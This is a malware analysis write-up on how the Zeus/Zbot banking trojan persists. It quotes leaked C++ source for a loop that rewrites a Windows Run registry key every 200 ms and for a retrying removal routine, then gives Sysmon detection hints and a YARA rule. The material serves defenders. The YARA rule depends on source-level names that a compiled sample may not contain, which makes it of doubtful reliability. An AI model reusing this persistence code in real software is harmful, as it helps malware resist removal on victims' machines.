# Zeus/Zbot - Continuous Registry Run Key Persistence
**Repository:** Malware-Collection-master  
**File Path:** Zeus/source/client/corecontrol.cpp  
**Language:** C++  
**MITRE ATT&CK:** T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

---

## Overview

The Zeus (Zbot) banking trojan establishes persistence by aggressively writing its executable path to the `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run` registry key. To ensure its survival against manual or automated removal, Zeus runs a dedicated thread that continuously re-writes this registry value every 200 milliseconds. This technique guarantees that the malware will be executed at every user logon, making it highly resilient.

---

## Code Snippet 1: Autorun Loop Thread (Continuous Registry Write)

```cpp
static DWORD WINAPI procAutorun(void *data)
{
  HANDLE mutex = Sync::_waitForMutex(0, INFINITE);

  if(mutex == NULL)
  {
    WDEBUG0(WDDT_ERROR, "Failed");
    return 1;
  }

  WDEBUG0(WDDT_INFO, "Started.");

  WCHAR autorunName[50];
  WCHAR processPath[MAX_PATH];
  DWORD processPathSize;
  
  // Generate unique autorun key name based on bot ID
  Core::generateObjectName(Core::OBJECT_ID_REG_AUTORUN, autorunName, MalwareTools::KON_DEFAULT);
  
  // Get path to Zeus core executable
  Core::getPeSettingsPath(Core::PSP_COREFILE, processPath);
  
  // Quote path to handle spaces (e.g., "C:\Program Files\malware.exe")
  CWA(shlwapi, PathQuoteSpacesW)(processPath);
  processPathSize = Str::_LengthW(processPath);
  
  //Cycle - Continuous autorun enforcement loop
  if(Core::isActive())
  {
    CSTR_GETW(regPath, regpath_autorun);
    
    // Infinite loop: Rewrite Run key every 200ms until stopEvent is signaled
    while(CWA(kernel32, WaitForSingleObject)(coreData.globalHandles.stopEvent, 200) == WAIT_TIMEOUT)
    {
      // Write to HKCU\Software\Microsoft\Windows\CurrentVersion\Run
      Registry::_setValueAsString(HKEY_CURRENT_USER, regPath, autorunName, processPath, processPathSize);
    }
  }
  
  WDEBUG0(WDDT_INFO, "Stopped.");
  Sync::_freeMutex(mutex);

  return 0;
}
```

**What it does:**  
The `procAutorun` function runs in a continuous loop, triggered by a `WaitForSingleObject` timeout of 200 milliseconds. Inside the loop, it calls `Registry::_setValueAsString` to write the malware's path into the `HKCU\...\Run` key. This ensures the persistence mechanism is restored almost immediately if removed. The use of `PathQuoteSpacesW` handles file paths containing spaces, a common characteristic of system directories.

**Why it's T1547.001:**  
This is a classic example of persistence via Registry Run Keys. By adding an entry to this key, the malware ensures that the operating system will automatically execute it every time the user logs on. The aggressive, continuous rewriting loop is an advanced resilience mechanism designed to defeat simple remediation efforts, solidifying its classification as a robust implementation of this TTP.

---

## Code Snippet 2: Autorun Removal with Retry Logic

```cpp
bool CoreControl::_removeAutorun(void)
{
  WCHAR autorunName[50];
  Core::generateObjectName(Core::OBJECT_ID_REG_AUTORUN, autorunName, MalwareTools::KON_DEFAULT);
  
  CSTR_GETW(regPath, regpath_autorun);
  
  // Try 5 times with 500ms delays between attempts
  for(BYTE i = 0; i < 5; i++)
  {
    // Delete the registry value
    if(!Registry::_deleteValue(HKEY_CURRENT_USER, regPath, autorunName))
      return false;
    
    // Insurance against incomplete procAutorun() - wait for autorun thread to exit
    CWA(kernel32, Sleep)(500);
    
    // Verify deletion succeeded (autorun thread may have recreated it)
    if(!Registry::_valueExists(HKEY_CURRENT_USER, regPath, autorunName))
      return true;
  }

  return false;
}
```

**What it does:**  
The `_removeAutorun` function attempts to clean up the malware's persistence key during uninstallation. It demonstrates awareness of its own continuous persistence loop by attempting to delete the key up to five times, with a 500ms pause between each attempt. After each deletion, it re-checks if the key exists, expecting that the `procAutorun` thread might have rewritten it in the interim.

**Why it's T1547.001:**  
This removal logic is the inverse of the persistence mechanism and highlights the malware author's understanding of the technique's volatility. The retry loop is a direct acknowledgment of the aggressive rewriting behavior, confirming that the primary persistence mechanism is designed to be difficult to remove. This self-aware cleanup process is intrinsically linked to the initial T1547.001 implementation.

---

## Detection & Evasion

### Sysmon Telemetry

- **Event ID 13: RegistryEvent (Value Set)**: Look for an abnormally high volume of `SetValue` events targeting the same `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` key from a single process. A legitimate application typically sets this value once. Repetitive writes every few hundred milliseconds are highly indicative of Zbot's persistence loop.
  - **TargetObject:** `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\<generated_name>`
  - **Image:** Path to the Zeus executable.

- **Event ID 1: ProcessCreate**: The malware process will be created by `explorer.exe` during user logon as a direct result of the Run key being triggered.

### YARA Rule

```yara
rule T1547_Persistence_Zeus_RunKey_Loop
{
    meta:
        author = "Vengful"
        description = "Detects strings related to the Zeus/Zbot continuous Run Key persistence mechanism."
        reference = "Internal Research"
        date = "2025-11-25"
        mitre_attack = "T1547.001"

    strings:
        // Keywords related to registry path for autorun
        $reg_path = "regpath_autorun" wide ascii
        
        // Function name for the persistence thread
        $proc_autorun = "procAutorun" wide ascii

        // Object ID used to generate the unique registry key name
        $object_id = "OBJECT_ID_REG_AUTORUN" wide ascii
        
        // String constant for the Run key path itself
        $run_key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" wide

    condition:
        uint16(0) == 0x5A4D and // MZ header
        all of them
}
```
